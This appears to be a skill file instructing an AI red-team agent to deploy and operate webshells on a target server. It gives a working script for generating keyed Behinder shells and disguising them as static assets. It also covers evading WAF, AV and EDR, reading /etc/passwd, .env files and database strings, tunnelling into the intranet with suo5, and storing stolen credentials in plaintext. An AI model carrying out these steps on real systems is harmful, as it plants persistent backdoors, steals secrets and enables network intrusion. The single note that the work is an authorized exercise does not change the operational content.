---
name: webshell-toolkit
description: Launching and using Behinder / Godzilla / AntSword to upload and manage webshells, maintain access, and operate the target server
whenToUse: When you have an upload point/file write/command execution and need to deploy and operate a webshell
role: exploit
enabled: true
---

# WebShell toolkit (installed)

Directory `$DSH_HOME/redteam/toolkit/`; Java 25 is installed.

## Iron rule: the deployed shell must be a Behinder/Godzilla encrypted shell

**The user will connect to this entry point directly from the Behinder/Godzilla console**, so:
- **By default deploy only encrypted Behinder or Godzilla shells**, and record `shell_type` + `pass_key` (`redteam_webshell_add`).
- **One-liner shells (`?cmd=`), custom shells, and in-memory shells do not count as delivery**: the user cannot connect or interact with them. Use them only as **temporary relays** (for example to deliver the real shell or build a tunnel), and note "temporary relay, not a delivery entry point" in the note.
- Godzilla GUI generation requires a human at the console; **prefer the no-GUI Behinder generation below**, which produces a deliverable shell in one command.

## Generate a Behinder shell without GUI (recommended, scriptable)

A Behinder shell just bakes the key into the template: key = `md5(connection password)[:16]`. Bundled templates:
`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`

```bash
TK=$DSH_HOME/redteam/toolkit
PASS='Rt@2026#xz'                       # connection password (randomly generated; do not use rebeyond)
KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # Behinder wants the first 16 chars of the 32-char md5
# JSP: replace the template key
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
# PHP: same idea (template variable $key)
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
echo "connection password $PASS | key $KEY"      # write both into runs/ and redteam_webshell_add
```

- The default key `e45e329feb5d925b` = `md5("rebeyond")[:16]` (that is what the template comment means) — **you must replace it with your own password**; using the default hands the shell to defenders.
- If the target has a WAF/AV, use the unicode-escaped variant `shell_uni.jsp`: the key is also escaped and must be replaced per character as `\\u00xx` (python can generate it).
- Tested: all seven templates `shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` work with the single `sed` command above.

Godzilla shell (when a GUI is required):
```bash
DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
# Manage → Generate: payload java/jsp, encryptor Java_AES_BASE64, random password and key → upload after generation
```

## After upload, verify the user can connect
1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → expect 200 (**do not test with a GET cmd parameter**; Behinder/Godzilla shells do not respond to plaintext commands).
2. Create a connection in the Behinder or Godzilla GUI (URL + connection password) and click "Test connection" → success only if it connects; then run `id/whoami` in the virtual terminal.
3. Record fully: `url`, `shell_type=behinder|godzilla`, `pass_key=connection password`, `privilege`, `secret_ref` (evidence file); then **immediately build a suo5 tunnel** (skill `suo5-tunnel`).

## Tool inventory

| Tool | Launch command | Notes |
|---|---|---|
| Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES-encrypted traffic, JSP/PHP/ASPX |
| Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | Fully encrypted payloads for JSP/PHP/ASPX |
| AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | Select source directory `antSword-2.1.16` on first launch |
| suo5 tunnel | `./suo5-linux-amd64` | See skill `suo5-tunnel` |

## Typical flow (authorized exercise)
1. **Identify a write point**: upload vulnerability / arbitrary file write / admin plugin upload / template write / database file write (`INTO OUTFILE`).
2. **Generate payload**: choose JSP/JSPX/PHP/ASPX by target language (see "Generate a Behinder shell without GUI" above); generate a random password and record it in `runs/`.
3. **Upload and request**: `curl -s "https://target.example.com/upload/x.jsp"` to confirm 200; do not put the shell at an obvious path (such as `/shell.jsp`); use a random filename styled like a static asset.
4. **Connect and manage**: add URL + password in the tool, test the connection; after success run commands in the virtual terminal.
5. **Maintain and exploit**:
   - Collect `id/whoami/hostname/uname -a`, system accounts, internal IPs, routes.
   - **Immediately start a suo5 tunnel into the intranet** (skill `suo5-tunnel`; this is the standard channel for intranet breakthrough).
   - Collect sensitive files: `/etc/passwd`, configs, `.env`, source, database connection strings → store in `runs/`.
6. **Record**:
   - `redteam_webshell_add` (url / **shell_type** / **pass_key** / privilege / secret_ref)
   - `redteam_access_add` (host/account/method webshell/privilege/session reference)
   - `redteam_vuln_update` to mark the entry vulnerability as `exploited`
   - `redteam_http_evidence_add` to save the upload request and shell access request
   - `redteam_chain_add` (stage=exploit/access)

## Command execution (only for temporary relays)
If you only need one-off command execution, prefer an existing RCE or tunnel; no need to deploy a one-liner shell:
```bash
# Example: pass parameters through a temporary one-liner shell (delete after use; not a delivery entry point)
curl -s "https://target.example.com/upload/x.jsp?cmd=id"
# Behinder/Godzilla are GUI tools; from the command line, a suo5 tunnel plus regular tools is simpler
```

## Notes
- Generated shells may only be uploaded to **the target of this authorized exercise**; clean up as needed afterward (delete files, restore original state).
- Tool GUIs require a graphical session (`DISPLAY=:10.0` is available).
- Record credentials with `redteam_credential_add`: **write plaintext into `secret_value`** (shown directly in the panel for reuse), store the evidence file under `runs/` and reference it in `secret_ref`. The asset database stays on this machine only; do not take the database or its exports elsewhere.
- The target may have EDR/AV: test whether the shell survives first, and avoid repeated deployments that trigger alerts; if deployment fails, change language/encoding (JSP→JSPX→PHP) or change the upload point.
